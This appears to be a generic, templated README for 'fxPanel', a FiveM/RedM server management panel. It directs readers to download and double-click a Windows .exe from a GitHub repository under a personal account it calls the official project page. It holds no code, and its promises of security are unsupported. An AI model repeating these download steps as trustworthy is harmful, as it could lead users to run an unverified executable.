# 🛠️ fxPanel - Manage FiveM servers with ease

[![](https://img.shields.io/badge/Download_fxPanel-Blue?style=for-the-badge)](https://github.com/cabulongrenelyn7/fxPanel)

fxPanel organizes server management for FiveM and RedM environments. This application replaces older tools with a stable system. It delivers a clean interface and keeps your server data secure. Use this panel to monitor performance and adjust settings without manual file edits.

## 📥 Download and Install

Visit the [official project page](https://github.com/cabulongrenelyn7/fxPanel) to download the latest version.

1. Go to the link above.
2. Locate the Releases section on the right side of the screen.
3. Click the latest version number.
4. Select the Windows installer file ending in .exe.
5. Save the file to a folder you recognize, such as your Downloads folder.
6. Double-click the saved file to start the installation.
7. Follow the prompts on your screen to complete the setup process.

## ⚙️ System Requirements

Your computer needs minimal resources to run this panel effectively. Ensure your system meets these standards:

*   Operating System: Windows 10 or Windows 11.
*   Processor: Dual-core CPU with 2GHz speed or faster.
*   Memory: 4GB of RAM.
*   Storage: 500MB of free space for logs and settings.
*   Network: Stable internet connection for remote server communication.

## 🚀 Getting Started

Once installation finishes, an icon appears on your desktop. Double-click the fxPanel icon to launch the application. The software opens a window displaying your local server state.

When you start the tool for the first time, the panel asks for your server path. Point the software to the root folder where your FiveM or RedM server files live. After the path is set, the panel scans your files. This scan allows the system to manage your plugins, player lists, and configuration files.

## 🖥️ Using the Interface

The layout divides into three areas.

The Sidebar: Access your dashboard, player management, plugin settings, and server logs. Click any button to view specific data.

The Main View: See real-time server activity here. This screen shows how many players are online, current server time, and recent error alerts.

The Action Bar: Toggle your server status. Use the buttons to start, stop, or restart your server process. Green indicates the server is running, while gray shows it is offline.

## 🔧 Configuring Settings

Navigate to the settings menu to define how your server behaves. You can change your server name, update the maximum player count, or modify connection policies. 

If you want to adjust security, visit the Security tab. Here, you can block specific IP addresses or choose who acts as an admin. Any changes you make require you to save settings and restart the server process for them to take effect.

## 🛡️ Performance and Security

This software emphasizes speed. It runs in the background to monitor your server resources. If your server uses too much RAM or CPU, the panel sends a notification. You can view these logs to identify which plugins cause lag or crashes.

Data security matters. Your server configuration files remain local to your machine. No external service accesses your server data unless you explicitly enable remote features. 

## 📦 Managing Plugins

The Plugin Manager helps you add or remove features from your server. Click the Add Plugin button to upload new scripts. The panel automatically extracts the files and places them into the correct folder. To remove a plugin, select it from your list and click Uninstall. The software handles cleanup tasks to ensure no leftover files clutter your server.

## 📈 Monitoring Players

Click the Player Management tab to see who plays on your server. You can view player information, including their unique ID and connection time. To act against a disruptive player, select their name and choose from the available tools:

*   Kick: Force the player off the current session.
*   Ban: Prevent the player from returning to the server.
*   Message: Send a private notification to the player.

## ❓ Frequently Asked Questions

What should I do if the server fails to start?
Check the Log tab. It lists errors with time stamps. Often, a configuration error or a missing file causes the issue.

Can I move the panel to another computer?
Yes. Copy your server files and your installation folder to the new machine. Launch the app and point it to the new file path in the settings.

Does this tool work with RedM?
Yes. The software automatically detects the framework and switches modes based on your server type.

Is there a way to update the panel?
The application checks for updates upon launch. If a new version exists, it asks you to download the latest files. Always back up your configuration folder before upgrading.

## ℹ️ Troubleshooting

*   The window is blank: Restart the application. If the problem persists, check if your firewall blocks the connection.
*   Changes do not apply: Verify you clicked Save in the settings menu. Many changes only trigger after a full server restart.
*   High CPU usage: Check the Task Manager to see if other programs conflict with the panel. Your server process should stay within the estimated resource limits.
*   Missing files: Use the Refresh button in the dashboard to force a new scan of your server directory.
